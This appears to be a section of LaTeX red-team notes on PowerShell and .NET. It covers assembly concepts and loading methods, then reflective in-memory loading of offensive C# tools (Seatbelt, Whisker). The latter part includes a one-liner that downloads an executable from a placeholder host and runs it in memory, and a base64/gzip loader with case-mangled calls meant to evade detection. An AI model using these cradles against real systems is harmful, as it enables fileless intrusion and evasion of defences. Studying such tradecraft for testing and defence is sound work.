\section{pwsh, .NET and c\#}

\subsection{Concepts}

A .NET assembly is a compiled code library used in the .NET framework, which can contain executable code and resources.

Components of an Assembly:
\begin{itemize}
    \item 
        Modules: The basic building blocks of an assembly. Each assembly contains one or more modules. A module is a portable executable file such as a DLL or EXE.
    \item 
    Types: Classes, interfaces, enums, structs, and delegates defined within the assembly.
    \item 
    Metadata: Information about the types defined in the assembly, including their names, visibility, base classes, and members. This metadata is used by the .NET runtime to enforce type safety and manage the execution of the code.
    \item 
    Manifest: Contains information about the assembly itself, including its version, culture, and a list of all files that make up the assembly. The manifest is part of the assembly's metadata.
\end{itemize}

Types of Assemblies:
\begin{itemize}
    \item 
        Private Assemblies: Used by a single application and stored in the application's directory.
    \item 
        Shared Assemblies: Intended to be shared among multiple applications and are usually stored in the Global Assembly Cache (GAC).
\end{itemize}

\subsubsection{Type}
In PowerShell when working with assemblies, a \verb+type+ refers to a data structure that defines the characteristics and behaviors of objects. Types in PowerShell can be classes, structs, enums, interfaces, or delegates defined within a .NET assembly.

\subsection{.NET interaction}
\subsubsection{Loading .NET assemblies}
\verb+Add-Type+:
\begin{verbatim}
Add-Type -AssemblyName 'System.Windows.Forms'
Add-Type -AssemblyName 'C:\src\universal\src\output\Universal.Cmdlets.dll'
\end{verbatim}

\verb+Assembly+:
\begin{verbatim}
# LoadFile
$assembly = [Reflection.Assembly]::LoadFile("c:\temp\file.dll")

# LoadFrom
[System.Reflection.Assembly]::LoadFrom('C:\src\universal\src\output\Universal.Cmdlets.dll')

# LoadWithPartialName (deprecated) similar to Add-Type -AssemblyName
[System.Reflection.Assembly]::LoadWithPartialName('System.Windows.Forms')
\end{verbatim}

\verb+Import-Module+ (load assemblies and expose any cmdlets, cannot load exe assemblies): 
\begin{verbatim}
Import-Module 'C:\src\universal\src\output\Universal.Cmdlets.dll'
\end{verbatim}

\verb+using Statement+ (at parse time used when defining PowerShell classes): 
\begin{verbatim}
using assembly C:\src\universal\src\output\Universal.Cmdlets.dll
\end{verbatim}

 
\subsubsection{Instanciate .NET object}

\begin{verbatim}
# if namespace defined
[<DLL_NAMESPACE>.<DLL_OBJECT>]::<method>(<parameters>)
# OR

$i = New-Object <DLL_CLASS>
$i.<prop1> = <value>
$r = $i.function()
\end{verbatim}




\subsection{PSify an c\# exe}

\href{http://theredwindows.net/index.php/2021/07/28/reflexion-en-powershell/}{Reflexion in powershell}

\begin{verbatim}
$asm.EntryPoint.Invoke($null, [Object[]] @(@(,([String[]] @("triage")))))

$data = (New-Object System.Net.WebClient).DownloadData('http://<local_ip>:<port|80>/<asm_ref_bin_path><asm_ref_exe_name>.exe'); $asm = [System.Reflection.Assembly]::Load($data); $OldConsoleOut = [Console]::Out; $StringWriter = New-Object IO.StringWriter ; [Console]::SetOut($StringWriter) ; $asm.EntryPoint.Invoke($null, [Object[]] @(@(,([String[]] @(<asm_ref_params>)))));[Console]::SetOut($OldConsoleOut); $Results = $StringWriter.ToString(); $Results
```
= asm_ref_bin_path: windows/NetFramework_4.7_x64/
= asm_ref_exe_name: Seatbelt
= asm_ref_exe_cmd: "klist"
= asm_ref_params: "-group=all", "-full"
\end{verbatim}


this is taken from
\href{https://github.com/S3cur3Th1sSh1t/PowerSharpPack.git}{PowerSharpBinaries}
\begin{verbatim}
So what did i basically do here?
    First of all clone each C# Repo.
    Set the class and main methods public
    Afterwards compiling each binary
    Gzip-compress and base64-Encode the binary base64 and load it in powershell via 
        [System.Reflection.Assembly]::Load($DecompressedDecodedBinary).
\end{verbatim}

\begin{verbatim}
function Invoke-Whisker
{

    [CmdletBinding()]
    Param (
        [String]
        $Command = ""

    )
    $a=New-Object IO.MemoryStream(,[Convert]::FromBAsE64String("HERE"))
    $decompressed = New-Object IO.Compression.GzipStream($a,[IO.Compression.CoMPressionMode]::DEComPress)
    $output = New-Object System.IO.MemoryStream
    $decompressed.CopyTo( $output )
    [byte[]] $byteOutArray = $output.ToArray()
    $RAS = [System.Reflection.Assembly]::Load($byteOutArray)
    
    $OldConsoleOut = [Console]::Out
    $StringWriter = New-Object IO.StringWriter
    [Console]::SetOut($StringWriter)

    [Whisker.Program]::main($Command.Split(" "))

    [Console]::SetOut($OldConsoleOut)
    $Results = $StringWriter.ToString()
\end{verbatim}

it is then possible to dot-source the function and call it
\begin{verbatim}
PS C:\Users\btables\Desktop> . Invoke-Whisker.ps1
PS C:\Users\btables\Desktop> gci -Path Function:\Invoke-Whisker
PS C:\Users\btables\Desktop> Invoke-Whisker
\end{verbatim}

